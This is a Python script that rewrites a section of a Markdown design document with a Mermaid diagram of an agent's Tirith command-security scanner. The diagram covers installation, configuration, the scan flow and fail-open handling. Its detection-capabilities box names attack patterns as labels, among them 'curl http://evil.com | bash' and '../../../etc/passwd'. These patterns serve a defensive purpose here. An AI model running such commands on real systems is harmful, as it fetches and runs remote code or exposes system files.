#!/usr/bin/env python3
"""修复 Tirith 安全扫描架构图 - 版本 2"""

import glob
import re

# 找到文件
files = glob.glob('/home/meizu/Documents/my_agent_project/hermes-agent/Hermes-Agent*工具注册*.md')
filepath = files[0]

print(f"处理文件：{filepath}")

# 读取文件
with open(filepath, 'r', encoding='utf-8') as f:
    content = f.read()

# 找到起始和结束位置
start_marker = '### 2.5 Tirith 安全扫描架构'
end_marker = '## 3. 核心业务流程'

start_idx = content.find(start_marker)
end_idx = content.find(end_marker, start_idx)

if start_idx == -1 or end_idx == -1:
    print(f"✗ 未找到标记")
    print(f"  start_idx: {start_idx}")
    print(f"  end_idx: {end_idx}")
    exit(1)

print(f"✓ 找到位置：{start_idx} - {end_idx}")

# 提取要替换的部分
old_section = content[start_idx:end_idx]
print(f"旧章节长度：{len(old_section)} 字符")

# 新的 Mermaid 图表
new_section = '''### 2.5 Tirith 安全扫描架构

```mermaid
flowchart TD
    Start[Tirith 安全扫描] --> AutoInstall[自动安装机制]
    
    AutoInstall --> CheckPATH[检查 PATH 中的<br/>tirith 二进制]
    CheckPATH -->|未找到 | Download[后台线程下载<br/>GitHub Release]
    Download --> Verify[SHA-256 校验和 +<br/>cosign 签名验证]
    Verify --> Install[安装到<br/>$HERMES_HOME/bin/tirith]
    Install --> PersistFail[失败持久化:<br/>~/.hermes/.tirith-install-failed<br/>24h TTL]
    CheckPATH -->|已找到 | CheckCommand
    
    CheckCommand[check_command_security<br/>command]
    
    CheckCommand --> LoadConfig[加载配置]
    LoadConfig --> ConfigDetails["• tirith_enabled default: True<br/>• tirith_timeout default: 5s<br/>• tirith_fail_open default: True"]
    
    ConfigDetails --> ExecuteTirith[执行 tirith scan command]
    ExecuteTirith --> TimeoutCtrl[超时控制：5s<br/>可配置]
    TimeoutCtrl --> ParseJSON[解析 JSON 输出:<br/>findings + summary + action]
    
    ParseJSON --> ReturnResult[返回结果]
    ReturnResult --> ActionResult["• action: allow/warn/block<br/>• findings: [{severity, title,<br/>description, rule_id}...]<br/>• summary: 人类可读摘要"]
    
    ActionResult --> ErrorHandling[错误处理]
    ErrorHandling --> ErrorTypes["spawn 错误/超时/<br/>未知退出码"]
    ErrorTypes --> FailOpen{fail_open?}
    FailOpen -->|True| Allow[allow]
    FailOpen -->|False| Block[block]
    
    Allow --> Done[完成]
    Block --> Done
    Done --> Final[返回给调用者]
    
    subgraph Tirith 检测能力
        Homograph[Homograph URL 攻击<br/>西里文/希腊字母混淆]
        PipeInject[管道注入:<br/>curl http://evil.com | bash]
        TermInject[终端注入:<br/>ANSI 转义序列注入]
        SSHPhish[SSH 钓鱼:<br/>伪造主机密钥验证]
        CodeExec[代码执行:<br/>eval, exec, subprocess 注入]
        PathTraversal[文件路径遍历:<br/>../../../etc/passwd]
        CmdInject[命令注入:<br/>$, ``, ; cmd, | cmd]
    end
    
    ParseJSON -.-> Tirith 检测能力
    
    style Start fill:#90EE90
    style Final fill:#87CEEB
    style Allow fill:#90EE90
    style Block fill:#FFB6C1
    style Homograph fill:#FFE4B5
    style PipeInject fill:#FFE4B5
    style TermInject fill:#FFE4B5
    style SSHPhish fill:#FFE4B5
    style CodeExec fill:#FFE4B5
    style PathTraversal fill:#FFE4B5
    style CmdInject fill:#FFE4B5
```

## 3. 核心业务流程'''

# 替换
new_content = content[:start_idx] + new_section + content[end_idx:]

if new_content != content:
    print("✓ 成功替换")
    # 写回文件
    with open(filepath, 'w', encoding='utf-8') as f:
        f.write(new_content)
    print(f"✓ 文件已更新：{filepath}")
else:
    print("✗ 替换失败")
